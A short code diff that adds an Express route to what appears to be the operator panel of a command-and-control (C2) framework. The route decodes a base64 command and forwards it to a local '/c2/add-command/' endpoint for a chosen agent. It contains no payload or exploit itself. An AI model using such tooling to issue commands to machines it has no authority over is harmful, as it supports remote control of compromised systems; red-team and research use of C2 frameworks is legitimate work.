@@ -75,5 +75,31 @@ router.get('/agents/:agentID', function(req, res, next) {
     });
 });
 
+router.post('/agent/:agentID/command', function(req, res, next) {
+    // decode command with base64 using UTF-8
+    let utf8str = atob(req.body.command);
+    let command = decodeURIComponent(escape(utf8str));
+
+    console.log('command: ' + command);
+
+    // make a post request to the agent-api for agent details
+    axios.post('http://localhost:8001/c2/add-command/' + req.params.agentID, {
+        command: command
+    })
+    .then(function (response) {
+        // Check if response.data is an array
+        console.log(response.data);
+        if (response.data.length > 0) {
+            res.send('Command sent');
+        } else {
+            console.log('No data returned from API');
+            res.send('Command failed to send');
+        }
+    
+    })
+    .catch(function (error) {
+        console.log(error);
+    });
+});
 
 module.exports = router;
